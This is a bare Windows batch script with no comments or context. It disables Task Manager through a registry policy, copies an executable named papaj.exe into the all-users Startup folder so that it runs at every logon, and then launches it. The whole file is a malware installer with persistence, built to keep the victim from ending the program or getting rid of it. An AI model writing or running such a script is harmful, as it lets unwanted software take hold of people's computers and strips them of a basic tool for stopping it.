@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\papaj.exe" /q
copy papaj.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\papaj.exe" /y
start papaj.exe